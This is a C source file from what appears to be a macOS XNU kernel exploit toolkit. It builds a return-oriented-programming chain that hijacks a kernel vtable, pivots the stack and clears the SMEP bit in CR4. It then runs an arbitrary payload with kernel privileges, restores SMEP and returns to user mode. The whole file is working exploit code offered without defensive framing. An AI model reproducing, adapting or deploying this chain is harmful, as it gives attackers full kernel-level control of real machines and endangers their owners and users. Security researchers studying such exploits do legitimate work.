#import "lsym.h"
#import "lsym_gadgets.h"
static uint64_t corrupt_ptr = 0;

static void cleanup() {
    if (corrupt_ptr) {
        for (int i=-16; i<16; i++) {
            ((uint64_t*)corrupt_ptr)[i] = 0;
        }
    }
}

char lsym_payload(uint64_t *reg1, uint64_t *reg2, uint16_t regs, void* payload) {
    if (regs == LSYM_PAYLOAD_VTABLE) {
        // SMEP / NX Bypassing XNU ROP Payload
        // reg1: pointer to vtable. this is expected to be held in RAX in-kernel.

        lsym_map_t* mapping_kernel = lsym_map_file("/mach_kernel");
        if (!mapping_kernel) {
            mapping_kernel = lsym_map_file("/System/Library/Kernels/kernel");
        }

        uint64_t* scratch = alloc((void*)0x3133700000, 0x10000);
        kernel_fake_stack_t* stack = alloc((void*)0x3134000000, sizeof(kernel_fake_stack_t));
        uint64_t* rax = (uint64_t*)reg1;
        
        uint64_t  rip                     = ROP_RDI_TO_RBX_CALL_130H_RAX(mapping_kernel);
        rax    [0x130 / sizeof(uint64_t)] = ROP_RAX_TO_RDI_RCX_TO_RSI_CALL_58H_RAX(mapping_kernel);
        rax    [0x58  / sizeof(uint64_t)] = ROP_PUSH_RBP_8H_RDI_TO_RAX_JMP_0H_RAX(mapping_kernel);
        rax    [0x8   / sizeof(uint64_t)] = (uint64_t) scratch;
        
        for (int i=0; i < 16; i++) {
            if (!rax[i]) {
                rax[i] = rip; // fill all non-necessarily-corrupted pointers in the vtable.
            }
        }
        
        scratch[0x0   / sizeof(uint64_t)] = ROP_RAX_TO_RDI_RCX_TO_RSI_CALL_58H_RAX(mapping_kernel);
        
        scratch[0x58  / sizeof(uint64_t)] = ROP_RBX_TO_RSI_CALL_30H_RAX(mapping_kernel);
        scratch[0x30  / sizeof(uint64_t)] = ROP_RDI_TO_RBX_CALL_130H_RAX(mapping_kernel); // rbx = rdi
        scratch[0x130 / sizeof(uint64_t)] = ROP_PIVOT_RAX(mapping_kernel);

        scratch[0x8   / sizeof(uint64_t)] = 0;
        scratch[0x10  / sizeof(uint64_t)] = 0;
        scratch[0x18  / sizeof(uint64_t)] = ROP_POP_RSP(mapping_kernel);
        scratch[0x20  / sizeof(uint64_t)] = (uint64_t)stack->__rop_chain;
        
        PUSH_GADGET(stack) = ROP_POP_RAX(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t)scratch;
        PUSH_GADGET(stack) = ROP_RSI_TO_RBX_CALL_178H_RAX(mapping_kernel);
        scratch[0x178 / sizeof(uint64_t)] = ROP_POP_RAX(mapping_kernel);
        
        PUSH_GADGET(stack) = ROP_POP_R14_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t) &corrupt_ptr;
        PUSH_GADGET(stack) = JUNK_VALUE;
        
        PUSH_GADGET(stack) = ROP_WRITE_RBX_WHAT_R14_WHERE_POP_RBX_POP_R14_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = JUNK_VALUE; // pop rbx
        PUSH_GADGET(stack) = JUNK_VALUE; // pop r14
        PUSH_GADGET(stack) = JUNK_VALUE; // pop rbp
        
        
        /*
         
         Disable SMEP
         
         */
        
        PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t) scratch;
        PUSH_GADGET(stack) = ROP_CR4_TO_RAX_WRITE_RAX_TO_pRCX_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = JUNK_VALUE;
        PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t) ~ 0x00100000;
        PUSH_GADGET(stack) = ROP_AND_RCX_RAX_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = JUNK_VALUE;
        PUSH_GADGET(stack) = ROP_POP_RDI(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t) scratch;
        
        PUSH_GADGET(stack) = ROP_RAX_TO_CR4_WRITE_ESI_TO_60H_RDI_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = JUNK_VALUE;
        
        /*
         
         Run payload without SMEP.
         
         */
        
        
        PUSH_GADGET(stack) = (uint64_t) payload;
        PUSH_GADGET(stack) = (uint64_t) cleanup;
        
        /*
         
         Enable SMEP
         
         */
        
        PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t) scratch;
        PUSH_GADGET(stack) = ROP_CR4_TO_RAX_WRITE_RAX_TO_pRCX_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = JUNK_VALUE;
        PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t) 0x00100000;
        PUSH_GADGET(stack) = ROP_OR_RCX_RAX_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = JUNK_VALUE;
        PUSH_GADGET(stack) = ROP_POP_RDI(mapping_kernel);
        PUSH_GADGET(stack) = (uint64_t) scratch;
        PUSH_GADGET(stack) = ROP_RAX_TO_CR4_WRITE_ESI_TO_60H_RDI_POP_RBP(mapping_kernel);
        PUSH_GADGET(stack) = JUNK_VALUE;
        
        // locks are unlocked in this function
        uint64_t iokit_nf = lsym_find_symbol(mapping_kernel, "_iokit_notify");
	if(!iokit_nf) return 0;
        iokit_nf -= lsym_kernel_base(mapping_kernel);
        
        // we need to find the movl r12d, eax stuff until retq. the call and the lea can change on each kernel version. this should stay the same for a long time.
        // we know that the lea happens 0xc bytes before anyway (thank you otool -tv!)
        uint64_t unlock = (uint64_t)memmem(mapping_kernel->map + iokit_nf, 0x100 /* should be enough */, (char*)((uint8_t[]){0x44, 0x89, 0xE0, 0x48, 0x83, 0xC4, 0x18, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3}), 0x12);
	if(!unlock) return 0;
        
        unlock -= 0xc;
        unlock -= (uint64_t) mapping_kernel->map;
        unlock = lsym_slide_pointer(unlock + lsym_kernel_base(mapping_kernel));
        
        PUSH_GADGET(stack) = unlock;
        PUSH_GADGET(stack) = JUNK_VALUE; // addq 0x8, rsp
        PUSH_GADGET(stack) = JUNK_VALUE; // addq 0x8, rsp
        PUSH_GADGET(stack) = JUNK_VALUE; // addq 0x8, rsp
        PUSH_GADGET(stack) = JUNK_VALUE; // pop rbx
        PUSH_GADGET(stack) = JUNK_VALUE; // pop r12
        PUSH_GADGET(stack) = JUNK_VALUE; // pop r13
        PUSH_GADGET(stack) = JUNK_VALUE; // pop r14
        PUSH_GADGET(stack) = JUNK_VALUE; // pop r15
        PUSH_GADGET(stack) = JUNK_VALUE; // pop rbp
        PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_thread_exception_return"); // retq - back to usermode
        PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (uint64_t) "pwn: thread_exception_return returned."); // won't be called, ever.
        PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_panic");
	return 1;
    }
    return 0;
}
